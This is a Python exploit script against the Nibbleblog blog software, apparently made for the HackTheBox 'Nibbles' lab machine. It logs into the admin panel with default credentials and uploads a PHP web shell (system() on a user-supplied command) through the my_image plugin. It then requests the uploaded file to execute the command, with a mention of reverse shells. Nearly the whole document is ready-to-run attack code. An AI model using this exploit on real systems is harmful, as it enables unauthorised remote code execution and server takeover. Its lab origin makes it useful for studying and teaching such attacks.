import argparse
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from colorama import Fore, Style, init
import random

def print_banner():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = random.choice(colors)
    print(banner_color + """
███╗   ██╗██╗██████╗ ██████╗ ██╗     ███████╗███████╗             ██╗   ██╗██╗   ██╗███╗   ███╗    ██╗   ██╗██╗   ██╗███╗   ███╗
████╗  ██║██║██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝             ╚██╗ ██╔╝██║   ██║████╗ ████║    ╚██╗ ██╔╝██║   ██║████╗ ████║
██╔██╗ ██║██║██████╔╝██████╔╝██║     █████╗  ███████╗              ╚████╔╝ ██║   ██║██╔████╔██║     ╚████╔╝ ██║   ██║██╔████╔██║
██║╚██╗██║██║██╔══██╗██╔══██╗██║     ██╔══╝  ╚════██║               ╚██╔╝  ██║   ██║██║╚██╔╝██║      ╚██╔╝  ██║   ██║██║╚██╔╝██║
██║ ╚████║██║██████╔╝██████╔╝███████╗███████╗███████║██╗██╗██╗       ██║   ╚██████╔╝██║ ╚═╝ ██║       ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═══╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝╚═╝╚═╝       ╚═╝    ╚═════╝ ╚═╝     ╚═╝       ╚═╝    ╚═════╝ ╚═╝     ╚═╝

Created By: H088yHaX0R / (HTB - AKA: Marz0)

""" + Style.RESET_ALL)

def login(session, ip, port, username, password):
    url = f"http://{ip}:{port}/nibbleblog/admin.php"
    data = {
        'username': username,
        'password': password
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': f'http://{ip}:{port}',
        'Connection': 'keep-alive',
        'Referer': url,
        'Upgrade-Insecure-Requests': '1'
    }
    response = session.post(url, headers=headers, data=data)
    return "nibbleblog - Dashboard" in response.text

def upload_file(session, ip, port, command):
    url = f"http://{ip}:{port}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
    escaped_command = command.replace("'", "\\'")
    php_code = f"<?php system('{escaped_command}'); ?>"
    m = MultipartEncoder(
        fields={
            'plugin': 'my_image',
            'title': 'My image',
            'position': '4',
            'caption': '',
            'image': ('id.php', php_code, 'application/x-php'),
            'image_resize': '1',
            'image_width': '230',
            'image_height': '200',
            'image_option': 'auto'
        },
        boundary='---------------------------26400341973157864459123969455'
    )

    headers = {
        'Content-Type': m.content_type,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Referer': url
    }

    response = session.post(url, headers=headers, data=m)
    return "<b>Warning</b>:" in response.text

def fetch_image_php(session, ip, port):
    url = f"http://{ip}:{port}/nibbleblog/content/private/plugins/my_image/image.php"
    response = session.get(url)
    print("[+] Response from image.php:"+"\n\n", response.text)

def main():
    init(autoreset=True)  # Initialize colorama to automatically reset styling after each print statement
    print_banner()  # Print the banner with a random color

    parser = argparse.ArgumentParser(description="Upload PHP code to Nibbleblog and execute it.")
    parser.add_argument('-i', '--ip', required=True, help="The IP address of the server")
    parser.add_argument('-p', '--port', type=int, default=80, help="The port number for the server, default is 80")
    parser.add_argument('-c', '--command', required=True, help="The command to execute in the PHP system function")
    parser.add_argument('-u', '--username', default='admin', help="Username for login")
    parser.add_argument('-pwd', '--password', default='nibbles', help="Password for login")

    args = parser.parse_args()

    session = requests.Session()
    try:
        if login(session, args.ip, args.port, args.username, args.password):
            print("Logged in successfully.")
            if upload_file(session, args.ip, args.port, args.command):
                print("[+] PHP code uploaded successfully! Executing command or your revshell. You can ctrl+c to exit now.")
                fetch_image_php(session, args.ip, args.port)
            else:
                print("[-] Failed to upload PHP code or the expected warning was not found in the response.")
        else:
            print("[-] Failed to log in.")
    except KeyboardInterrupt:
        print("[!] User exited the script")

if __name__ == "__main__":
    main()
